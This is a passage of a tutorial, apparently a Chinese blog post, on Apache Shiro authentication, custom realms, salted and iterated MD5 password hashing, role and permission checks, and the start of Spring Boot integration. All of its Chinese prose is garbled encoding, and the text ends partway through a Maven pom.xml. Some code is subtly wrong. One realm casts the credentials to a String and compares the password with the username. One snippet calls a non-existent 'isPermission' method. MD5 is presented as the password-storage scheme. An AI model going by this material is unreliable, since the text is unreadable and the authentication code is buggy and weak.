èº«ä»½è®¤è¯ï¼å°±æ¯å¤æ­ä¸ä¸ªç¨æ·æ¯å¦ä¸ºåæ³ç¨æ·çå¤çè¿ç¨ãæå¸¸ç¨çç®åèº«ä»½è®¤è¯æ¹å¼æ¯ç³»ç»éè¿æ ¸å¯¹ç¨æ·è¾å¥çç¨æ·ååå£ä»¤ï¼çå¶æ¯å¦ä¸ç³»ç»ä¸­å­å¨çè¯¥ç¨æ·çç¨æ·ååå£ä»¤ä¸è´ï¼æ¥å¤æ­ç¨æ·èº«ä»½æ¯å¦æ­£ç¡®ã\n\n\n# è®¤è¯çç¸å³å¯¹è±¡\n\n# subject ä¸»ä½\n\nè®¿é®ç³»ç»çç¨æ·ï¼ä¸»ä½å¯ä»¥æ¯ç¨æ·ãç¨åºç­ï¼è¿è¡è®¤è¯çé½ç§°ä¸ºä¸»ä½ï¼\n\n# principal èº«ä»½ä¿¡æ¯\n\nä¸»ä½ï¼subjectï¼è¿è¡èº«ä»½è®¤è¯çæ è¯ï¼æ è¯å¿é¡»å·æå¯ä¸æ§ï¼å¦ç¨æ·åãææºå·ãé®ç®±å°åç­ï¼ä¸ä¸ªä¸»ä½å¯ä»¥æå¤ä¸ªèº«ä»½ï¼ä½æ¯å¿é¡»æä¸ä¸ªä¸»èº«ä»½ï¼Primary Principalï¼ã\n\n# credential å­è¯ä¿¡æ¯\n\nåªæä¸»ä½èªå·±ç¥éçå®å¨ä¿¡æ¯ï¼å¦å¯ç ãè¯ä¹¦ç­ã\n\n\n# è®¤è¯çæµç¨\n\n\n\n\n# å®ç°ä¸ä¸ªæç®åçè®¤è¯\n\n 1. æ·»å shiroçä¾èµï¼æ¬æ¬¡ä½¿ç¨çshiroçæ¬æ¯ï¼shiro1.5.3\n    \n    <dependencies>\n      <dependency>\n        <groupId>org.apache.shiro</groupId>\n        <artifactId>shiro-core</artifactId>\n        <version>1.5.3</version>\n      </dependency>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 2. å¼å¥shiroéç½®æä»¶ï¼è¿ä¸ªéç½®æä»¶å¨åç»­çæ´åä¸­ç¨ä¸å°ï¼åªæ¯ä¸ºäºå­¦ä¹ ä½¿ç¨çä¸ä¸ªæ¨¡æçåºæ¯ï¼ä»¥åçç¨æ·èº«ä»½ä¿¡æ¯æ¯è¦ä»æ°æ®åºä¸­åçã\n    \n    [users]\n    zhangsan=123456\n    lisi=123.bmk\n    \n    \n    1\n    2\n    3\n    \n\n 3. æµè¯è®¤è¯çä»£ç \n    \n    package com.pwddd.shirodemo;\n    \n    import org.apache.shiro.SecurityUtils;\n    import org.apache.shiro.authc.IncorrectCredentialsException;\n    import org.apache.shiro.authc.UnknownAccountException;\n    import org.apache.shiro.authc.UsernamePasswordToken;\n    import org.apache.shiro.mgt.DefaultSecurityManager;\n    import org.apache.shiro.realm.text.IniRealm;\n    import org.apache.shiro.subject.Subject;\n    \n    public class TestAuthenticator {\n        public static void main(String[] args) {\n    \n            // 1. åå»ºSecurityManager\n            DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();\n    \n            // 2. åå»ºé»è®¤çIniRealm æå®iniéç½®æä»¶çä½ç½®\n            IniRealm iniRealm = new IniRealm("classpath:shiro.ini");\n    \n            // 3. ç»securityManagerè®¾ç½®ä¸ä¸ªrealm\n            defaultSecurityManager.setRealm(iniRealm);\n    \n            // 4. å°å®å¨å·¥å·ç±»ä¸­è®¾ç½®ä¸ä¸ªå®å¨ç®¡çå¨\n            SecurityUtils.setSecurityManager(defaultSecurityManager);\n    \n            // 5. è·åä¸»ä½å¯¹è±¡\n            Subject subject = SecurityUtils.getSubject();\n    \n            // 6. æ¨¡æç»éä¿¡æ¯åå»ºä»¤ç\n            UsernamePasswordToken token = new UsernamePasswordToken("zhangsan", "123456");\n    \n            try {\n    \n                // 7. å°è¯ä½¿ç¨ä»¤çç»é\n                subject.login(token);\n                System.out.println("è®¤è¯æå"+subject.isAuthenticated());\n            }catch (UnknownAccountException e){\n                System.out.println("ç¨æ·åä¸å­å¨");\n            }catch (IncorrectCredentialsException e){\n                System.out.println("è®¤è¯æªéè¿");\n            }\n        }\n    }\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    \n\nå¯¹åºçå¼å¸¸åç±»ï¼\n\n * DisabledAccountExceptionï¼å¸å·è¢«ç¦ç¨ï¼\n\n * LockedAccountExceptionï¼å¸å·è¢«éå®ï¼\n\n * ExcessiveAttemptsExceptionï¼ç»å½å¤±è´¥æ¬¡æ°è¿å¤ï¼\n\n * ExpiredCredentialsExceptionï¼å­è¯è¿æï¼ç­\n\n\n# æºç è¿½è¸ªshiroä¸­çè®¤è¯è¿ç¨\n\nç¨æ·åéªè¯çè°ç¨ï¼\n\ndoGetAuthenticationInfo:162, SimpleAccountRealm (org.apache.shiro.realm)\ngetAuthenticationInfo:571, AuthenticatingRealm (org.apache.shiro.realm)\ndoSingleRealmAuthentication:180, ModularRealmAuthenticator (org.apache.shiro.authc.pam)\ndoAuthenticate:273, ModularRealmAuthenticator (org.apache.shiro.authc.pam)\nauthenticate:198, AbstractAuthenticator (org.apache.shiro.authc)\nauthenticate:106, AuthenticatingSecurityManager (org.apache.shiro.mgt)\nlogin:275, DefaultSecurityManager (org.apache.shiro.mgt)\nlogin:260, DelegatingSubject (org.apache.shiro.subject.support)\nmain:35, TestAuthenticator (com.pwddd.shirodemo)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\næç»å¨org.apache.shiro.realm.SimpleAccountRealm#doGetAuthenticationInfoæ ¹æ®tokenä¸­çç¨æ·åå¨å¨å¯¹åºçéç½®æä»¶ä¸­æ¥æ¾å¯¹åºçç¨æ·ï¼æ­¤å¤è¿æ²¡æåå¯ç çæ ¡éªã\n\n\n\nå¯ç æ ¡éªçè°ç¨ï¼\n\ndoCredentialsMatch:127, SimpleCredentialsMatcher (org.apache.shiro.authc.credential)\nassertCredentialsMatch:600, AuthenticatingRealm (org.apache.shiro.realm)\ngetAuthenticationInfo:581, AuthenticatingRealm (org.apache.shiro.realm)\ndoSingleRealmAuthentication:180, ModularRealmAuthenticator (org.apache.shiro.authc.pam)\ndoAuthenticate:273, ModularRealmAuthenticator (org.apache.shiro.authc.pam)\nauthenticate:198, AbstractAuthenticator (org.apache.shiro.authc)\nauthenticate:106, AuthenticatingSecurityManager (org.apache.shiro.mgt)\nlogin:275, DefaultSecurityManager (org.apache.shiro.mgt)\nlogin:260, DelegatingSubject (org.apache.shiro.subject.support)\nmain:35, TestAuthenticator (com.pwddd.shirodemo)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\næç»å¨org.apache.shiro.authc.credential.SimpleCredentialsMatcher#doCredentialsMatchä¸­éªè¯å¯ç æ¯å¦å¹éã\n\n\n\nshiroä¸­çRealmçç±»ç»æå¦ä¸ï¼\n\n\n\næ ¹æ®æºç åç°ï¼è®¤è¯ä½¿ç¨çæ¯SimpleAccountRealm\n\n\n\nå¨SimpleAccountRealmæä¸¤ä¸ªæ¹æ³ï¼ä¸ä¸ªæ¯ç¨æ¥è®¤è¯çï¼å¦ä¸ä¸ªæ¯ç¨æ¥ææçã\n\npublic class SimpleAccountRealm extends AuthorizingRealm {\n  //.......çç¥\n  protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException {\n    UsernamePasswordToken upToken = (UsernamePasswordToken) token;\n    SimpleAccount account = getUser(upToken.getUsername());\n\n    if (account != null) {\n\n      if (account.isLocked()) {\n        throw new LockedAccountException("Account [" + account + "] is locked.");\n      }\n      if (account.isCredentialsExpired()) {\n        String msg = "The credentials for account [" + account + "] are expired";\n        throw new ExpiredCredentialsException(msg);\n      }\n\n    }\n\n    return account;\n  }\n\n  protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) {\n    String username = getUsername(principals);\n    USERS_LOCK.readLock().lock();\n    try {\n      return this.users.get(username);\n    } finally {\n      USERS_LOCK.readLock().unlock();\n    }\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# èªå®ä¹çRealm\n\nå¨ä¸é¢çç¨åºä¸­ï¼æä»¬ä½¿ç¨çshiroèªå¸¦çIniRealmï¼å¹¶ä¸ç¨æ·åå¯ç æ¯å¨å­å°iniéç½®æä»¶ä¸­çï¼å¨å¤§é¨åçæåµä¸ï¼æä»¬éè¦ä»ç³»ç»çæ°æ®åºä¸­è¯»åç¸å³çç¨æ·ä¿¡æ¯ï¼å æ­¤éè¦èªå®ä¹Realmã\n\npackage com.pwddd.shirodemo.realm;\n\nimport org.apache.shiro.authc.AuthenticationException;\nimport org.apache.shiro.authc.AuthenticationInfo;\nimport org.apache.shiro.authc.AuthenticationToken;\nimport org.apache.shiro.authc.SimpleAuthenticationInfo;\nimport org.apache.shiro.authz.AuthorizationInfo;\nimport org.apache.shiro.realm.AuthenticatingRealm;\nimport org.apache.shiro.realm.AuthorizingRealm;\nimport org.apache.shiro.subject.PrincipalCollection;\n\npublic class CustomerRealm extends AuthorizingRealm {\n    @Override\n    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) {\n        return null;\n    }\n\n    @Override\n    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException {\n        String principal = (String) authenticationToken.getPrincipal();\n        if ("zhangsan".equals(principal)){\n          \n          \t// è¿éæ¨¡æä»æ°æ®åºä¸­æ¥è¯¢è·åå°çç¨æ·ååå¯ç \n            SimpleAuthenticationInfo authenticationInfo = new SimpleAuthenticationInfo("zhangsan", "123", this.getName());\n            return authenticationInfo;\n        }\n        return null;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\nèªå®ä¹Realmçæµè¯æ¹æ³ï¼\n\npackage com.pwddd.shirodemo;\n\nimport com.pwddd.shirodemo.realm.CustomerRealm;\nimport org.apache.shiro.SecurityUtils;\nimport org.apache.shiro.authc.AuthenticationException;\nimport org.apache.shiro.authc.UsernamePasswordToken;\nimport org.apache.shiro.mgt.DefaultSecurityManager;\nimport org.apache.shiro.subject.Subject;\n\npublic class TestCustomerRealm {\n    public static void main(String[] args) {\n        DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();\n        defaultSecurityManager.setRealm(new CustomerRealm());\n\n        SecurityUtils.setSecurityManager(defaultSecurityManager);\n\n        Subject subject = SecurityUtils.getSubject();\n\n        UsernamePasswordToken token = new UsernamePasswordToken("zhangsan", "123");\n\n\n        try {\n            subject.login(token);\n        } catch (AuthenticationException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n# ä½¿ç¨MD5å å¯åç\n\n> å¨ä¸é¢çæµè¯ä¸­ï¼æä»¬ä¸ç´ä½¿ç¨çæ¯ææå¯ç çæ¹å¼ï¼è¿ç§æ¹å¼æå¾å¤§çå®å¨éæ£ï¼åæä»¬ä½¿ç¨å®å¨æ¡æ¶çåè¡·ç¸èç¦»ãå¨å®éçåºæ¯ä¸­ï¼ä¸è¬æ¯å¨æ³¨åé¶æ®µï¼å°ç¨æ·è®¾ç½®çå¯ç å çç¶åæ£åå­å¨å°æ°æ®åºä¸­ï¼ç¶åä½¿ç¨shiroä»æ°æ®åºä¸­è¯»ååºçåç§æï¼å®æå¯ç æ ¡éªã\n\n# MD5æµè¯\n\npackage com.pwddd.shirodemo;\n\nimport org.apache.shiro.crypto.hash.Md5Hash;\n\npublic class TestMD5 {\n  public static void main(String[] args) {\n\n    Md5Hash hash = new Md5Hash();\n    hash.setBytes("123456".getBytes());\n    System.out.println(hash.toHex()); // 313233343536\n\n\n    // md5å å¯\n    Md5Hash md5Hash = new Md5Hash("123456");\n    System.out.println(md5Hash.toHex()); // e10adc3949ba59abbe56e057f20f883e\n    // å ç\n    Md5Hash md5HashWithSalt = new Md5Hash("123456","123/BMK#");\n    System.out.println(md5HashWithSalt.toHex()); //a43ebab3045680d4b3d6c5ccac659d10\n\n    //æ£å\n    Md5Hash hashInter = new Md5Hash("123456", "123/BMK#", 1024);\n    System.out.println(hashInter.toHex()); //a991e133559f1891893b60a3c04e8740\n\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n# èªå®ä¹Realmå®ç°MD5\n\npackage com.pwddd.shirodemo.realm;\n\nimport org.apache.shiro.authc.AuthenticationException;\nimport org.apache.shiro.authc.AuthenticationInfo;\nimport org.apache.shiro.authc.AuthenticationToken;\nimport org.apache.shiro.authc.SimpleAuthenticationInfo;\nimport org.apache.shiro.authz.AuthorizationInfo;\nimport org.apache.shiro.realm.AuthenticatingRealm;\nimport org.apache.shiro.realm.AuthorizingRealm;\nimport org.apache.shiro.subject.PrincipalCollection;\n\npublic class CustomerRealm extends AuthorizingRealm {\n  @Override\n  protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) {\n    return null;\n  }\n\n  @Override\n  protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException {\n    String credentials = (String) authenticationToken.getCredentials();\n    if ("zhangsan".equals(credentials)){\n      \n      // æ¨¡ææ¥åºæ¥çå¯ç æ¯å å¯åçå¯ç ï¼å¶ä»ä¸å\n      SimpleAuthenticationInfo authenticationInfo = new SimpleAuthenticationInfo(\n        "zhangsan",\n        "e10adc3949ba59abbe56e057f20f883e",\n        this.getName());\n\n      return authenticationInfo;\n    }\n    return null;\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\næµè¯æ¹æ³ï¼\n\npackage com.pwddd.shirodemo;\n\nimport com.pwddd.shirodemo.realm.CustomerRealm;\nimport org.apache.shiro.SecurityUtils;\nimport org.apache.shiro.authc.AuthenticationException;\nimport org.apache.shiro.authc.UsernamePasswordToken;\nimport org.apache.shiro.authc.credential.HashedCredentialsMatcher;\nimport org.apache.shiro.mgt.DefaultSecurityManager;\nimport org.apache.shiro.subject.Subject;\n\npublic class TestMD5Realm {\n    public static void main(String[] args) {\n        DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();\n\n        CustomerRealm customerRealm = new CustomerRealm();\n\n        // è®¾ç½®md5å å¯\n        HashedCredentialsMatcher hashedCredentialsMatcher = new HashedCredentialsMatcher();\n        hashedCredentialsMatcher.setHashAlgorithmName("MD5");\n\n        customerRealm.setCredentialsMatcher(hashedCredentialsMatcher);\n\n        defaultSecurityManager.setRealm(customerRealm);\n\n        SecurityUtils.setSecurityManager(defaultSecurityManager);\n\n        Subject subject = SecurityUtils.getSubject();\n\n        UsernamePasswordToken token = new UsernamePasswordToken("zhangsan", "123456");\n\n        try {\n            subject.login(token);\n            System.out.println("ç»éæå");\n        } catch (AuthenticationException e) {\n            e.printStackTrace();\n        }\n\n\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n# èªå®ä¹Realmå®ç°MD5å saltæ¹å¼\n\npackage com.pwddd.shirodemo.realm;\n\nimport org.apache.shiro.authc.AuthenticationException;\nimport org.apache.shiro.authc.AuthenticationInfo;\nimport org.apache.shiro.authc.AuthenticationToken;\nimport org.apache.shiro.authc.SimpleAuthenticationInfo;\nimport org.apache.shiro.authz.AuthorizationInfo;\nimport org.apache.shiro.realm.AuthenticatingRealm;\nimport org.apache.shiro.realm.AuthorizingRealm;\nimport org.apache.shiro.subject.PrincipalCollection;\nimport org.apache.shiro.util.ByteSource;\n\npublic class CustomerRealm extends AuthorizingRealm {\n    @Override\n    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) {\n        return null;\n    }\n\n    @Override\n    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException {\n        String principal = (String) authenticationToken.getPrincipal();\n\n        if ("zhangsan".equals(principal)){\n            SimpleAuthenticationInfo authenticationInfo = new SimpleAuthenticationInfo(\n                    "zhangsan",\n                    "a43ebab3045680d4b3d6c5ccac659d10",\n                    // ç±äºçä¹æ¯ä»æ°æ®åºä¸­æ¥åºæ¥çï¼å æ­¤å¨è¿éä¸èµ·éç½®äº\n                    ByteSource.Util.bytes("123/BMK#"),\n                    this.getName());\n\n            return authenticationInfo;\n        }\n        return null;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\næµè¯æ¹æ³åä¸é¢çä¸æ ·ã\n\n# èªå®ä¹Realm å®ç° èªå®ä¹MD5+salt+æ£å\n\n 1. å¦æä½¿ç¨äºæ£åhashï¼åä»æ°æ®åºä¸­æ¥åºæ¥çæ¯æ£åä¹åçï¼å æ­¤realmä¸éè¦å\n\n 2. æµè¯æ¹æ³ä¸­éè¦æå®æ£åçæ¬¡æ°ï¼å ä¸ºç¨æ·è¾å¥ææå¯ç æ¶ï¼shrioä¸ç¥éæ£åçæ¬¡æ°ï¼å æ­¤å¯¹æ¯ä¼å¤±è´¥ã\n    \n    package com.pwddd.shirodemo;\n    \n    import com.pwddd.shirodemo.realm.CustomerRealm;\n    import org.apache.shiro.SecurityUtils;\n    import org.apache.shiro.authc.AuthenticationException;\n    import org.apache.shiro.authc.IncorrectCredentialsException;\n    import org.apache.shiro.authc.UsernamePasswordToken;\n    import org.apache.shiro.authc.credential.HashedCredentialsMatcher;\n    import org.apache.shiro.mgt.DefaultSecurityManager;\n    import org.apache.shiro.subject.Subject;\n    \n    public class TestMD5Realm {\n      public static void main(String[] args) {\n        DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();\n    \n        CustomerRealm customerRealm = new CustomerRealm();\n    \n        // è®¾ç½®md5å å¯\n        HashedCredentialsMatcher hashedCredentialsMatcher = new HashedCredentialsMatcher();\n        hashedCredentialsMatcher.setHashAlgorithmName("MD5");\n        // è®¾ç½®æ£åæ¬¡æ°\n        hashedCredentialsMatcher.setHashIterations(1024);\n    \n        customerRealm.setCredentialsMatcher(hashedCredentialsMatcher);\n    \n        defaultSecurityManager.setRealm(customerRealm);\n    \n        SecurityUtils.setSecurityManager(defaultSecurityManager);\n    \n        Subject subject = SecurityUtils.getSubject();\n    \n        UsernamePasswordToken token = new UsernamePasswordToken("zhangsan", "123456");\n    \n        try {\n          subject.login(token);\n          System.out.println("ç»éæå");\n        } catch (IncorrectCredentialsException e) {\n          e.printStackTrace();\n          System.out.println("å¯ç éè¯¯");\n        }\n      }\n    }\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    \n\n\n# Shiroææ\n\n> ææï¼å³è®¿é®æ§å¶ï¼æ§å¶è°è½è®¿é®åªäºèµæºãä¸»ä½è¿è¡èº«ä»½è®¤è¯åéè¦åéæéæ¹å¯è®¿é®ç³»ç»çèµæºï¼å¯¹äºæäºèµæºæ²¡ææéæ¯æ æ³è®¿é®çã\n\n\n# Shiro ææçå³é®å¯¹è±¡\n\nWhoï¼å³ä¸»ä½ï¼Subjectï¼ï¼ä¸»ä½éè¦è®¿é®ç³»ç»ä¸­çèµæºã\n\nWhatï¼å³èµæºï¼Resource)ï¼å¦ç³»ç»èåãé¡µé¢ãæé®ãç±»æ¹æ³ãç³»ç»ååä¿¡æ¯ç­ãèµæºåæ¬èµæºç±»ååèµæºå®ä¾ï¼æ¯å¦ååä¿¡æ¯ä¸ºèµæºç±»åï¼ç±»åä¸ºt01çååä¸ºèµæºå®ä¾ï¼ç¼å·ä¸º001çååä¿¡æ¯ä¹å±äºèµæºå®ä¾ã\n\nHowï¼æé/è®¸å¯ï¼Permission)ï¼è§å®äºä¸»ä½å¯¹èµæºçæä½è®¸å¯ï¼æéç¦»å¼èµæºæ²¡ææä¹ï¼å¦ç¨æ·æ¥è¯¢æéãç¨æ·æ·»å æéãæä¸ªç±»æ¹æ³çè°ç¨æéãç¼å·ä¸º001ç¨æ·çä¿®æ¹æéç­ï¼éè¿æéå¯ç¥ä¸»ä½å¯¹åªäºèµæºé½æåªäºæä½è®¸å¯ã\n\n\n# ææçæµç¨\n\n\n\n\n# ææçæ¹å¼\n\n * åºäºè§è²çè®¿é®æ§å¶\n\n * RBACåºäºè§è²çè®¿é®æ§å¶ï¼Role-Based Access Controlï¼æ¯ä»¥è§è²ä¸ºä¸­å¿è¿è¡è®¿é®æ§å¶\n\nif(subject.hasRole("admin")){\n   //æä½ä»ä¹èµæº\n}\n\n\n1\n2\n3\n\n\n * åºäºèµæºçè®¿é®æ§å¶\n   \n   * RBACåºäºèµæºçè®¿é®æ§å¶ï¼Resource-Based Access Controlï¼æ¯ä»¥èµæºä¸ºä¸­å¿è¿è¡è®¿é®æ§å¶\n   \n   if(subject.isPermission("user:update:01")){ //èµæºå®ä¾\n     //å¯¹01ç¨æ·è¿è¡ä¿®æ¹\n   }\n   if(subject.isPermission("user:update:*")){  //èµæºç±»å\n     //å¯¹01ç¨æ·è¿è¡ä¿®æ¹\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n\n\n# æéå­ç¬¦ä¸²\n\næéå­ç¬¦ä¸²çè§åæ¯ï¼èµæºæ è¯ç¬¦ï¼æä½ï¼èµæºå®ä¾æ è¯ç¬¦ï¼æææ¯ å¯¹åªä¸ªèµæºçåªä¸ªå®ä¾å·æä»ä¹æä½ï¼â:âæ¯èµæº/æä½/å®ä¾çåå²ç¬¦ï¼æéå­ç¬¦ä¸²ä¹å¯ä»¥ä½¿ç¨*ééç¬¦ã\n\nä¾å­ï¼\n\n * ç¨æ·åå»ºæéï¼user:createï¼æuser:create:*\n * ç¨æ·ä¿®æ¹å®ä¾001çæéï¼user:update:001\n * ç¨æ·å®ä¾001çæææéï¼user:*ï¼001\n\n\n# ææå®ç°æ¹å¼\n\n * ç¼ç¨å¼\n\nSubject subject = SecurityUtils.getSubject();\nif(subject.hasRole(âadminâ)) {\n\t//ææé\n} else {\n\t//æ æé\n}\n\n\n1\n2\n3\n4\n5\n6\n\n * æ³¨è§£å¼\n\n@RequiresRoles("admin")\npublic void hello() {\n\t//ææé\n}\n\n\n1\n2\n3\n4\n\n * æ ç­¾å¼\n\nJSP/GSP æ ç­¾ï¼å¨JSP/GSP é¡µé¢éè¿ç¸åºçæ ç­¾å®æï¼\n<shiro:hasRole name="admin">\n\t<!â ææéâ>\n</shiro:hasRole>\næ³¨æ: Thymeleaf ä¸­ä½¿ç¨shiroéè¦é¢å¤éæ!\n\n\n1\n2\n3\n4\n5\n\n\n\n# å¼åå®ç°\n\n 1. èªå®ä¹realm\n\npackage com.pwddd.shirodemo.realm;\n\nimport org.apache.shiro.authc.AuthenticationException;\nimport org.apache.shiro.authc.AuthenticationInfo;\nimport org.apache.shiro.authc.AuthenticationToken;\nimport org.apache.shiro.authc.SimpleAuthenticationInfo;\nimport org.apache.shiro.authz.AuthorizationInfo;\nimport org.apache.shiro.authz.SimpleAuthorizationInfo;\nimport org.apache.shiro.realm.AuthorizingRealm;\nimport org.apache.shiro.subject.PrincipalCollection;\nimport org.apache.shiro.util.ByteSource;\n\npublic class CustomerMD5Realm extends AuthorizingRealm {\n    /**\n     * ææ\n     * @param principalCollection\n     * @return\n     */\n    @Override\n    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) {\n\n        String principal = (String) principalCollection.getPrimaryPrincipal();\n        System.out.println("--------------------------------------------");\n        System.out.println("principal:"+principal);\n\n        SimpleAuthorizationInfo simpleAuthorizationInfo = new SimpleAuthorizationInfo();\n        simpleAuthorizationInfo.addRole("admin");\n\n        simpleAuthorizationInfo.addStringPermission("user:create:*");\n        return simpleAuthorizationInfo;\n    }\n\n    /**\n     * è®¤è¯\n     * @param authenticationToken\n     * @return\n     * @throws AuthenticationException\n     */\n    @Override\n    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException {\n\n        String principal = (String) authenticationToken.getPrincipal();\n\n        if ("zhangsan".equals(principal)){\n\n            AuthenticationInfo authenticationInfo = new SimpleAuthenticationInfo(\n                    principal,\n                    "a991e133559f1891893b60a3c04e8740",\n                    ByteSource.Util.bytes("123/BMK#"),\n                    this.getName()\n            );\n            return authenticationInfo;\n\n        }\n        return null;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n\n 2. æææµè¯ä»£ç \n\npackage com.pwddd.shirodemo;\n\nimport com.pwddd.shirodemo.realm.CustomerMD5Realm;\nimport org.apache.shiro.SecurityUtils;\nimport org.apache.shiro.authc.AuthenticationException;\nimport org.apache.shiro.authc.IncorrectCredentialsException;\nimport org.apache.shiro.authc.UnknownAccountException;\nimport org.apache.shiro.authc.UsernamePasswordToken;\nimport org.apache.shiro.authc.credential.HashedCredentialsMatcher;\nimport org.apache.shiro.mgt.DefaultSecurityManager;\nimport org.apache.shiro.subject.Subject;\n\npublic class TestCustomerMD5Realm {\n    public static void main(String[] args) {\n\n        DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();\n        CustomerMD5Realm customerMD5Realm = new CustomerMD5Realm();\n\n        HashedCredentialsMatcher hashedCredentialsMatcher = new HashedCredentialsMatcher();\n        hashedCredentialsMatcher.setHashAlgorithmName("MD5");\n        hashedCredentialsMatcher.setHashIterations(1024);\n\n        customerMD5Realm.setCredentialsMatcher(hashedCredentialsMatcher);\n        defaultSecurityManager.setRealm(customerMD5Realm);\n\n        SecurityUtils.setSecurityManager(defaultSecurityManager);\n\n        Subject subject = SecurityUtils.getSubject();\n\n        UsernamePasswordToken token = new UsernamePasswordToken("zhangsan", "123456");\n\n        try {\n            subject.login(token);\n            System.out.println("è®¤è¯æå");\n            System.out.println(subject.hasRole("admin"));\n            System.out.println(subject.isPermitted("user:create:01"));\n        } catch (UnknownAccountException e) {\n//            e.printStackTrace();\n            System.out.println("ç¨æ·åä¸å­å¨");\n        } catch (IncorrectCredentialsException e){\n            System.out.println("å¯ç éè¯¯");\n        }\n\n\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n\n# æ´åSpringboot\n\n\n# æ´åçæè·¯\n\n\n\n\n# æ´åçæ­¥éª¤\n\n# 0. åå»ºSpringbooté¡¹ç®\n\n\n\n# 1. å¼å¥ç¸å³ä¾èµ\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>com.pwddd</groupId>\n    <artifactId>springboot_jsp_shiro</artifactId>\n    <version>1.0-SNAPSHOT</version>\n\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-parent</artifactId>\n        <version>2.6.4</version>\n    </parent>\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n    </properties>\n\n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n        </dependency>\n\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-test</artifactId>\n            <scope>test</scope>\n        </dependency>\n\n        <dependency>\n            <groupId>org.projectlombok</groupId>\n            <artifactId>lombok</artifactId>\n            <version>1.18.2</version>\n            <optional>true</optional>\n        </dependency>\n\n        <dependency>\n            <groupId>org.apache.tomcat.embed</groupId>\n            <artifactId>tomcat-embed-jasper</artifactId>\n        </dependency>\n\n        <dependency>\n            <groupId>jstl</groupId>\n            <artifactId>jstl</artifactId>\n            <version>1.2</version>\n        </dependency>\n\n    